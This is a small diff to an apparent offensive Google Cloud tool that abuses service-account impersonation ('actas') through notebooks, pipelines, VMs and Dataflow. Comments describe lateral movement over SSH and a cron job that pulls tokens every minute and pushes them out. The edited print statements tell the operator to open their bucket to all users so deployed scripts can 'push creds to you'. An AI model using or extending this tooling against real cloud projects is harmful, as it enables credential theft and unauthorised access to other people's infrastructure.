@@ -107,9 +107,6 @@ def deploy_notebook(project, source=None, target=None, bucket=None, role="unknow
     return fun_notebook_instance
 
 def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
-    # Create instance via notebook notebooks in default network
-    # SSH commands via vm for lateral movementa
-    # cron job pulls token every minute and pushes up
     utils.run_gcloud_command_local("gcloud config set project {}".format(project))
     pipeline_props = {"name": utils.random_name()}
 
@@ -147,7 +144,7 @@ def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknow
 
 def deploy_vm(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
     # Create instance in default network
-    # SSH commands via vm for lateral movementa
+    # SSH commands via vm for lateral movement
     # cron job pulls token every minute and pushes up
     utils.run_gcloud_command_local("gcloud config set project {}".format(project))
     instance_props = {"name": utils.random_name()}
@@ -294,7 +291,11 @@ def main():
         if exploit_cmd == "actas":
             if args.bucket:
                 print("*************************************************")
-                print("MAKE SURE YOU GIVE ALL USERS *WRITE* ACCESS TO YOUR BUCKET WITH gsutil iam ch <serviceAccountName>:objectCreator gs://{}. OTHERWISE, YOUR SCRIPTS WONT BE ABLE TO PUSH CREDS TO YOU.".format(args.bucket))
+                print(f"MAKE SURE YOU GIVE ALL USERS *WRITE* ACCESS TO YOUR BUCKET WITH gsutil iam ch <serviceAccountName>:objectCreator gs://{args.bucket}. OTHERWISE, YOUR SCRIPTS WONT BE ABLE TO PUSH CREDS TO YOU.")
+                print("*************************************************")
+            if args.bucket and args.actasmethod == "dataflow":
+                print("*************************************************")
+                print(f"MAKE SURE YOU GIVE ALL USERS *READ* ACCESS TO YOUR GCR REPOSITORY WITH gsutil iam ch <serviceAccountName>:objectViewer gs://{args.bucket}.")
                 print("*************************************************")
 
             if (args.actasmethod == "notebook" or
